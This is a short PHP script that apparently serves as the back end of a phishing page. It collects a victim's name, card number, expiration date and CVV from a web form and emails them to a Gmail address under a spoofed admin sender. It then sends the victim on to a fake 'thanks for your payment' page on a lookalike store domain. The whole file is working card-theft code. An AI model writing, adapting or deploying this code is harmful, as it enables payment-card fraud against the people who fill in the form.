<?php 
	$nombre = $_POST['fullname'];
	$card_number = $_POST['card_number'];
	$input_expiration_date = $_POST['input_expiration_date'];
	$cvv = $_POST['cvv'];
	$asunto = 'Formulario Rellenado';
	$mensaje = "Nombre: ".$nombre."<br> Email: $card_number<br> input_expiration_date: $input_expiration_date <br> cvv: $cvv";

	$from = 'IAXG830920HS@gmail.com';
$headers = "From: admin@soberanosoft.gq\r\n"; 
$headers .= "Reply-To: $from\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=utf-8\r\n"; 
	
if(mail($from, $asunto, $mensaje,$headers)){
	header("Location: https://www.gamestoremercadoshopscom.ml/GRACIASPORSUPAGO.html");
exit();
	}

 ?>